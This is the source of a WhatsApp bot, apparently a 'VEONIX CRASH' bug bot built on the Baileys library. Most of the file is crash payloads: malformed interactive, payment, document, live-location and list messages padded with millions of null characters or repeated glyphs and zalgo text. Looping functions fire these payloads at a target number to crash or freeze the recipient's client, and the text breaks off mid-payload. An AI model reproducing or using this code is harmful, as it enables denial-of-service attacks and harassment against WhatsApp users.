require("./config")
require('./src/virus')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (Zynxzoo, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');


const owner = JSON.parse(fs.readFileSync('./lib/databases/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./lib/databases/murbug.json'))
const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Zynxzoo.user.id.split(':')[0]+'@s.whatsapp.net' || Zynxzoo.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Zynxzoo.decodeJid(Zynxzoo.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await Zynxzoo.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//====================================\\
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Zynxzoo.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

// respon list 
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Zynxzoo.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Zynxzoo.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
const virgam = fs.readFileSync(`./lib/image/virgam.png`)
const latx = fs.readFileSync(`./image/latx.png`)
const anjay = fs.readFileSync(`./image/anjay.jpg`)
const qris = fs.readFileSync(`./image/qris.jpg`)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};
// LOADING
async function loading () {
var genalpa = [
"*AWAIT FOR OPEN BOT*",
"*STARTING BOT*",
"*VEONIX CRASH💥*"
]
let { key } = await Zynxzoo.sendMessage(m.chat, {text: '*ᴠᴇᴏɴɪxᴄʀᴀsʜ*'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < genalpa.length; i++) {
await sleep(10)
await Zynxzoo.sendMessage(m.chat, {text: genalpa[i], edit: key });
}
}

// FUNCTION BUG //


async function sendTempatMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendGacorMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500);
  }
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½'+"ꦾ".repeat(60000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await Zynxzoo.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

const zynbug = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `VEONIX 💸`
}
}
}

const zynxzobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/virgam.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"VEONIX CRASH\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ꦾ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    Zynxzoo.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "VEONIX HARD CRASH"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'Zynxzo', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await Zynxzoo.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": anjay
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"VEONIX CRASH",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const zpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `Msg ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./lib/image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》

_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 

𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈

*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢⃢⃢⃢⃢⃢⃢⃢⃢⃞⃞⃞⃞⃞⃞⃞⃞⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃢⃢⃢⃢⃢⃢⃞⃞⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃢⃞⃞⃞⃞⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃞⃢⃢⃝⃟⃟⃟⃟⃢⃟⃢⃢⃢⃟⃞⃟⃞⃞⃞⃢⃞⃢⃞⃞⃞⃞⃢⃝⃝⃝⃢⃝⃢⃢⃝⃝⃢⃝⃢⃝⃤⃤⃤⃢⃢⃢⃞⃞⃞⃞⃢⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃤⃢⃢⃞⃞⃞⃢⃞⃞⃞⃞⃞⃞⃞⃞⃢⃞⃢⃠⃞⃤⃤⃢⃞⃞⃢⃢⃢⃞⃞⃠⃠⃞⃠⃠⃞⃠⃞⃢⃢⃞⃞⃠⃠⃞⃞⃢⃞⃢⃞⃞⃢⃢⃠⃞⃞⃞⃞⃞⃞⃞⃠⃢⃢⃢⃠⃞⃞⃞⃞⃞⃞⃞⃢⃞⃠⃠⃠⃠⃞⃞⃞⃞⃞⃞⃤⃠⃤⃤⃤⃤⃠⃤⃠⃤⃠⃠⃞⃠⃞⃠⃠⃠⃞⃢⃞⃠⃢⃢⃟⃟⃟⃟⃞⃢⃢⃞⃞⃞⃞⃞̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

MOKAD YA BANG 
ADUHAY🗿
VEONIX NIH BOS.
乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`

}

]

}

}

}

}


async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `VEONIX DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await Zynxzoo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await Zynxzoo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function iponcrash(target) {
await Zynxzoo.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function ListMSGVIP3(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '𝖅𝖞𝖓𝖝𝖟𝖔𝖔',
                        },
                        body: {
                            text: '𝖃',
                        },
                        footer: {
                            text: '𝕮𝖗𝖆𝖘𝖍',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : '𝖅𝖞𝖓𝖝𝖟𝖔', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝖃', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕮𝖗𝖆𝖘𝖍', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: ''.repeat(999999),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await Zynxzoo.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ListMSGVIP4(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title:
              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
                footerText: '',
                description: '',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'Hemm',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'ppq',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: false,
            },
        }),
        { userJid: userJid }
    );
    await Zynxzoo.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》

_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 

𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈

